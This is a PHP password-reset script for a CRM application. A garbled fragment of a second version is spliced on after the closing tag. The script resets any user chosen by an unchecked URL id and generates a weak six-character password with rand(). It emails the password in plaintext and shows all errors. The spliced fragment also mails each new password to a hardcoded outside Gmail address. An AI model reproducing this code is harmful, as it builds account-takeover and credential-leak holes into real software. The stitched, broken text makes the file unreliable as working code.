<?php
	include("../library/library.php");
	
	error_reporting(-1);
	ini_set('display_errors', 'On');
	set_error_handler("var_dump");
	
	session_start();
	$menu = new Menu();

	$err="";
	$header = new Header();
	$footer = new Footer();
	$dblink = new DBLink();
	
	if($_GET)
	{
		//connect to DB
		
		$user= new User();
		$user->loadById($_GET['id']);
		
		$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$charactersLength = strlen($characters);
		$newPassword = '';
		for ($i = 0; $i < 6; $i++) {
			$newPassword .= $characters[rand(0, $charactersLength - 1)];
		}
		$user->updatePassword($newPassword);
		$to=$user->getEmailAddress();
		$message="The Password for your KoodoMobileCRM account has been reset to:\n ".$newPassword;
		$from="From: Michaelfain@live.com";
		if(mail($to,"KoodoMobileCRM Password Reset", $message,$from)){
			header("location:UserManager.php");
		}
		
		exit();
		
			
    }
	header("location:UserManager.php");
?>
obileCRM account has been reset to:\n ".$newPassword;
		mail( "junggeonc@gmail.com", $subject, $message, $headers );
		if(mail( $to, $subject, $message, $headers )){
			header("location:UserManager.php");
		}
		
		exit();
		
			
    }
	header("location:UserManager.php");
?>
